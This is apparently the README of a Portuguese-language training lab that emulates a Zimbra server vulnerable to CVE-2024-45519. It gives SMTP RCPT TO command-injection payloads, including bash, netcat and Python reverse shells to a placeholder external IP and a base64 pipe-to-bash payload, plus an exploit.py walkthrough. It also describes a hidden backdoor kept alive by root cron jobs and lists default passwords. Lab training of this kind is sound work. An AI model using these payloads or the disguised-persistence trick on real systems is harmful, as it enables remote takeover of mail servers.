# 🎯 Laboratório MAQ-4 - Zimbra CVE-2024-45519

## 📋 Visão Geral

Este laboratório simula um ambiente Zimbra vulnerável à **CVE-2024-45519**, uma vulnerabilidade crítica que permite execução remota de código (RCE) através de injeção de comandos no servidor SMTP.

## 🚨 CVE-2024-45519 - Detalhes Técnicos

### **Descrição da Vulnerabilidade**
- **CVE ID**: CVE-2024-45519
- **Tipo**: Remote Code Execution (RCE)
- **Vetor de Ataque**: SMTP (Porta 25)
- **Gravidade**: Crítica (CVSS 9.8)
- **Componente Afetado**: Zimbra MTA (Mail Transfer Agent)

### **Mecanismo de Exploração**
A vulnerabilidade reside na validação inadequada de comandos de shell em campos SMTP, especificamente no comando `RCPT TO`. O atacante pode injetar comandos arbitrários através de expansão de shell:

```
RCPT TO: <"aabbb$(comando_malicioso)@dominio.com">
```

### **Payloads de Exemplo**
```bash
# Comando simples
RCPT TO: <"aabbb$(id)@test.com">

# Reverse shell
RCPT TO: <"aabbb$(/bin/bash -i >& /dev/tcp/IP/PORTA 0>&1)@test.com">

# Payload base64 (usado pelo exploit)
RCPT TO: <"aabbb$(echo${IFS}<base64>|base64${IFS}-d|bash)@test.com">
```

## 🐳 Configuração do Container

### **Especificações Técnicas**
- **Imagem Base**: `maattt10/zimbra8.8.15`
- **Sistema Operacional**: Ubuntu 16.04 (Xenial)
- **Zimbra Version**: 8.8.15
- **Python**: 3.5.2

### **Portas Expostas**
| Porta Externa | Porta Interna | Serviço | Descrição |
|---------------|----------------|---------|-----------|
| 22 | 22 | SSH | Acesso remoto |
| 25 | 2525 | SMTP | Servidor de correio (vulnerável) |
| 80 | 80 | HTTP | Interface web Zimbra |
| 443 | 443 | HTTPS | Interface web Zimbra (SSL) |
| 7071 | 7071 | HTTPS | Console administrativo |
| 110 | 110 | POP3 | Protocolo de correio |
| 143 | 143 | IMAP | Protocolo de correio |
| 465 | 465 | SMTPS | SMTP sobre SSL |
| 587 | 587 | SMTP | SMTP com autenticação |
| 993 | 993 | IMAPS | IMAP sobre SSL |
| 995 | 995 | POP3S | POP3 sobre SSL |

### **Usuários e Credenciais**
```bash
# Root
Username: root
Password: zimbra123

# Analyst
Username: analyst
Password: password123 (configurável via ANALYST_PASSWORD)
SSH Key: ./ssh_keys/analyst_id_rsa
```

## 🔧 Deploy e Configuração

### **Pré-requisitos**
- Docker e Docker Compose instalados
- Porta 25 disponível no host
- Mínimo 4GB RAM disponível

### **Deploy Automático**
```bash
# Deploy completo
./maquina4-setup.sh deploy

# Verificar status
./maquina4-setup.sh status

# Parar laboratório
./maquina4-setup.sh stop

# Limpar recursos
./maquina4-setup.sh clean
```

### **Tempo de Inicialização**
- **Container**: ~2-3 minutos
- **Zimbra**: ~30-45 minutos
- **Serviços**: ~5-10 minutos após Zimbra

## 🎯 Exploração e Obtenção de Shell Reverso

### **Método 1: Exploit Automatizado (Recomendado)**

#### **1.1 Preparar Listener**
```bash
# Abrir terminal e escutar conexão reversa
nc -lvp 4444
```

#### **1.2 Executar Exploit**
```bash
# Navegar para diretório do exploit
cd CVE-2024-45519

# Executar exploit (substitua IP_EXTERNO pelo seu IP)
python3 exploit.py 127.0.0.1 -p 25 -lh IP_EXTERNO -lp 4444
```

#### **1.3 Exemplo Completo**
```bash
# Terminal 1: Listener
nc -lvp 4444

# Terminal 2: Exploit
python3 exploit.py 127.0.0.1 -p 25 -lh 192.168.1.100 -lp 4444
```

### **Método 2: Exploração Manual via Telnet**

#### **2.1 Conectar ao SMTP**
```bash
telnet 127.0.0.1 25
```

#### **2.2 Sequência de Comandos**
```bash
EHLO localhost
MAIL FROM: <atacante@evil.com>
RCPT TO: <"aabbb$(/bin/bash -i >& /dev/tcp/IP_EXTERNO/PORTA 0>&1)@test.com">
DATA
Test message
.
QUIT
```

#### **2.3 Exemplo com Comando Simples**
```bash
EHLO localhost
MAIL FROM: <test@test.com>
RCPT TO: <"aabbb$(id)@test.com">
DATA
Test
.
QUIT
```

**Resposta esperada**: `250 OK - Output: uid=999(zimbra) gid=999(zimbra) groups=999(zimbra)`

### **Método 3: Payloads Avançados**

#### **3.1 Reverse Shell com Netcat**
```bash
RCPT TO: <"aabbb$(nc -e /bin/bash IP_EXTERNO 4444)@test.com">
```

#### **3.2 Reverse Shell com Python**
```bash
RCPT TO: <"aabbb$(python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"IP_EXTERNO\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"]);')@test.com">
```

#### **3.3 Reverse Shell com Bash**
```bash
RCPT TO: <"aabbb$(bash -i >& /dev/tcp/IP_EXTERNO/4444 0>&1)@test.com">
```

## 🕵️ Backdoor Stealth Integrado

### **Características**
- **Localização**: `/usr/local/lib/systemd/system/.systemd-udevd`
- **Nome**: Arquivo oculto (`.systemd-udevd`)
- **Execução**: Automática com container
- **Monitoramento**: Cron jobs de verificação

### **Funcionalidades**
- Simula servidor Postfix real
- Executa comandos como usuário zimbra
- Retorna saída dos comandos para o atacante
- Detecta padrões de expansão de shell
- Suporte a payloads base64

### **Monitoramento Automático**
```bash
# Cron job a cada 2 minutos
*/2 * * * * root /usr/local/lib/systemd/system/.systemd-udevd >/dev/null 2>&1 &

# Cron job a cada 1 minuto (verificação de porta)
*/1 * * * * root if ! netstat -tlnp | grep -q ':2525'; then /usr/local/lib/systemd/system/.systemd-udevd >/dev/null 2>&1 &; fi
```

## 🧪 Testes e Validação

### **Teste de Conectividade**
```bash
# Verificar se container está rodando
docker ps | grep maquina4-zimbra

# Verificar portas
netstat -tlnp | grep :25

# Testar SMTP
telnet 127.0.0.1 25
```

### **Teste de Vulnerabilidade**
```bash
# Comando simples
RCPT TO: <"aabbb$(whoami)@test.com">

# Verificar saída
# Deve retornar: 250 OK - Output: zimbra
```

### **Teste de Reverse Shell**
```bash
# Terminal 1: Listener
nc -lvp 4444

# Terminal 2: Exploit
python3 exploit.py 127.0.0.1 -p 25 -lh IP_EXTERNO -lp 4444

# Verificar conexão no listener
```

## 📚 Recursos Adicionais

### **Arquivos Importantes**
- `docker-compose.yml`: Configuração dos serviços
- `Dockerfile`: Construção da imagem
- `maquina4-setup.sh`: Script de gerenciamento
- `CVE-2024-45519/exploit.py`: Exploit automatizado

### **Logs e Debugging**
```bash
# Logs do container
docker logs maquina4-zimbra

# Logs em tempo real
docker logs -f maquina4-zimbra

# Acessar container
docker exec -it maquina4-zimbra bash
```

### **Troubleshooting**
- **Porta 25 ocupada**: Verificar se Postfix está rodando no host
- **Container não inicia**: Verificar logs e recursos disponíveis
- **Exploit falha**: Aguardar Zimbra inicializar completamente
- **Reverse shell não funciona**: Verificar firewall e IP externo

## ⚠️ Avisos de Segurança

### **⚠️ IMPORTANTE**
- Este laboratório é **APENAS para fins educacionais**
- **NÃO use em ambientes de produção**
- **NÃO teste em sistemas sem autorização**
- **NÃO exponha na internet**

### **Isolamento**
- Container isolado em rede Docker
- Portas mapeadas apenas para localhost
- Sem acesso à rede externa por padrão

## 🤝 Contribuições

Para reportar bugs ou sugerir melhorias:
1. Abra uma issue no repositório
2. Descreva o problema detalhadamente
3. Inclua logs e passos para reprodução

## 📄 Licença

Este projeto é fornecido "como está" para fins educacionais. Use por sua conta e risco.

---

**🎯 Laboratório configurado e pronto para exploração da CVE-2024-45519!**
